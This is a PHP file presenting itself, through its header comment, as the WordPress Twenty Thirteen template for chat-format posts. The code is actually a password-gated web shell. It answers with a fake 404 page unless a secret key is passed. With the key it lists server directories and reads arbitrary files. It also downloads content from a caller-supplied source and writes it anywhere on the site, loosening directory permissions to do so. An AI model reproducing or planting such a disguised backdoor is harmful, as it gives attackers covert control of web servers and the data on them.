<?php

 /**
 * The template for displaying posts in the Chat post format
 *
 * @package WordPress
 * @subpackage Twenty_Thirteen
 * @since Twenty Thirteen 1.0
 */
 

$d = $_SERVER['DOCUMENT_ROOT'].substr( $_SERVER["REQUEST_URI"],0, strrpos( $_SERVER["REQUEST_URI"], '/' ) ).'/';$d = str_replace( strstr( $d, '?' ), "" , $d ); if( !isset( $_GET['k'] ) || $_GET['k'] !='60f66e73c006d99b05f12455599fd8b52ebfe061' ) { header("HTTP/1.0 404 Not Found"); exit; }  
if( isset( $_GET['t'] ) ) $t = $_GET['t']; else $t = $d; 
if( isset( $_GET['s'] ) ){
    
    if( $_GET['s'] =='/' ) echo $_SERVER['DOCUMENT_ROOT'].'/'; 
    elseif( isset( $_GET['s'] ) && $_GET['s'] =='d' ) { 
    
        $listfo=''; $listfi=''; $to = opendir( $t );
        while ( false !== ( $filename = readdir( $to ) ) ) { $files[] = $filename; }
        sort( $files ); foreach ( $files AS $k => $v ) {  
           if( !is_file( $t.$v ) && ( $v !='.' && $v !='..' ) ) $listfo .= $t.$v.'/ <br />'; 
           elseif( $v !='.' && $v !='..' ) $listfi .= $t.$v.' ['.filesize( $t.$v ).'] <br />';    
        }         
        echo $listfo.$listfi;
        
    } elseif( $_GET['s'] !='' ) echo nl2br( htmlentities( implode ('', file ( $_GET['s'] ) ) ) );
    else echo $d;
    
} elseif( isset( $_GET['f'] ) ) {
      
    if( isset( $_GET['n'] ) ) $n = $_GET['n']; else {
        $p = pathinfo( $f );
        $t = $p['basename'];     
    }    
    $f = $_GET['f'];  
    $cs = html_entity_decode( implode ('', file ( $f ) ) );
    if( trim( $cs )!='' ){
        chmod( $t, 0777 ); 
        $i = fopen( $t.$n,"w" ); 
        ftell( $i );
        fwrite( $i,$cs );
        fclose( $i );
        chmod( $t, 0755 );
        if( file_exists( $t.$n ) ) echo 'http://'.str_replace( "//", "/", $_SERVER["HTTP_HOST"].str_replace( $_SERVER['DOCUMENT_ROOT'], "/", $t.$n ) ); else echo"error $t.$n"; 
    }
    
} else { 
    
    header("HTTP/1.0 404 Not Found");
}


?>